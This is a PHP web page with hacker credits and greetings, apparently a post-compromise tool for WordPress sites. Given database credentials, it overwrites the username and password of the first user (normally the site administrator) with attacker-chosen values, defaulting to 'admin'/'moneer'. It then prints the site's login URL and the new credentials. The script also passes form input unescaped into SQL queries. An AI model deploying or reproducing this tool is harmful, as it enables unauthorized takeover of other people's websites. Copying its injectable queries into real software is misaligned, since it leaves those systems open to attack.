<?php

##########################################################
##         Change Password Admin Wordpress              ##
##               Coded By Mr.Moneer                     ##
##    Greetz to  Mr.moad Alansery Hacker Ly.Ghost       ##
##                    (^_^)                             ##
##########################################################

?>
<html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <link rel="shortcut icon" href="http://im66.gulfup.com/iBa64y.ico" />
   <link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
    <title> Change Password Admin Wordpress   </title>  
	   <style>
    body {
	color:#f30b0b;
	background-color:#000000;
	}
    .input_mails {
	padding-left: 7px;
	padding-bottom: 3px;
	}
     table {
	 background: #060606;
     font-family: verdana;
     font-size: 15px;
	 background-color:
	 padding-left: 5px;
	 padding-bottom: 5px;
	 padding-top:5px;
	 }
	.btn {
	padding-top: 200px;
    padding-left: 130px;
	}
	.tdmsg {padding-top: 70px;}
	input {
	BORDER-RIGHT: #848482 1px solid;
    BORDER-TOP: #8A8B8A 1px solid;
    BORDER-LEFT: #757772 1px solid;
    BORDER-BOTTOM: #575455 1px solid;
    BACKGROUND-COLOR: #181818;
    font: 9pt tahoma;
    color: #ffffff;
     }
	textarea {
	BORDER-RIGHT: #848482 1px solid;
    BORDER-TOP: #8A8B8A 1px solid;
    BORDER-LEFT: #757772 1px solid;
    BORDER-BOTTOM: #575455 1px solid;
    BACKGROUND-COLOR: #181818;
    font: 9pt tahoma;
    color: #ffffff;
	}
	#submit {color: rgb(243, 11, 11);}
	h2 {  text-shadow: 0px 0px 5px  }
    h3 {  text-shadow: 0px 0px 5px  }
	.title {
     font-family:Orbitron;
    }
	 </style>
	  </head>
	      <body>
		  <center>
		<h3 class="title"> Change Password Admin Wordpress  </h3>
		<h3 class="title">Coded By Mr.Moneer </h2>
		</center>
	      <center>
		 <form method="POST">
		  <table border="0">
		     <tr>  
		 <td>  DB Host    </td><td><input type="text" name="host_wp" value="localhost"/></td>
		   </tr>
		   <tr>
		  <td> DB Name    </td><td><input type="text" name="db_wp" /></td>
		   </tr>
		   <tr>
		  <td> DB User    </td><td><input type="text" name="u_wp" /></td>
		   </tr>
		   <tr>
		  <td> DB Pass    </td><td><input type="text" name="p_wp" /></td>
		   </tr>
		    <tr>
		  <td> DB Prefix    </td><td><input type="text" name="dbpre" value="wp_" /></td>
		   </tr>
		   <tr>
		  <td> Username   </td><td><input type="text" name="user_wp" value="admin" /></td>
		   </tr>
		   <tr>
		 <td>  Password   </td><td><input type="text" name="pass_wp" value="moneer"/></td>
		   </tr>
		   
		   <tr>
		  <td> <input type="submit" name="submit_wp" value="Change" /></td>
		   </tr>
		 </form>
		   </table>
		   <?php
		   error_reporting(0);
		  /* function cpa($localhost,$db_user,$db_password,$db_name,$usernamewp,$Passwordwp){
		   
		   if(isset($localhost,$db_user,$db_password,$db_name,$usernamewp,$Passwordwp)){
		   
		   $localhost = $_POST['host_wp'];
           $db_user = $_POST['u_wp'];
           $db_password = $_POST['pass_wp'];
           $db_name = $_POST['db_wp'];
           $usernamewp = $_POST['user_wp'];
		   $Passwordwp = $_POST['pass_wp'];
		   $passhash = md5($Passwordwp);
           mysql_connect($localhost,$db_user,$db_password);
           mysql_select_db($db_name);
		  $sql = "UPDATE `wp_users` SET `user_login` = '$usernamewp', `user_pass` = '$passhash' WHERE `ID` = 1";
           mysql_query($sql);
		   }
		   
		   }*/
         //show
		   if($_POST['submit_wp']){

		   $localhost = $_POST['host_wp'];
           $db_user = $_POST['u_wp'];
           $db_password = $_POST['p_wp'];
           $db_name = $_POST['db_wp'];
           $usernamewp = $_POST['user_wp'];
		   $Passwordwp = $_POST['pass_wp'];
		   $dbpre = $_POST['dbpre'];;
		   $passhash = md5($Passwordwp);
           mysql_connect($localhost,$db_user,$db_password) or die(mysql_error());
           mysql_select_db($db_name)or die(mysql_error());
		   $sql = "UPDATE ".$dbpre."users SET `user_login` = '$usernamewp', `user_pass` = '$passhash' WHERE `ID` = 1";
           mysql_query($sql);
		   $sql2 = "SELECT * FROM $Prefixoptions WHERE `option_name` = 'siteurl'";
                 $query2 = mysql_query($sql2);
                 while($row=mysql_fetch_array($query2)){
				 echo "<table>";
				 echo "<tr><td>  WebSite Wordpress  </td><td> User </td><td>Pass</td></tr>";
			   echo "<tr><td>".$row['option_value']."/wp-login.php</td>";
			   echo "<td>".$usernamewp."</td>";
               echo "<td>".$Passwordwp."</td>";
               echo "</tr>";
			   echo "</table>";
                  }
				 
		                   }
		   ?>

		   </center>
		    </body>
</html>			
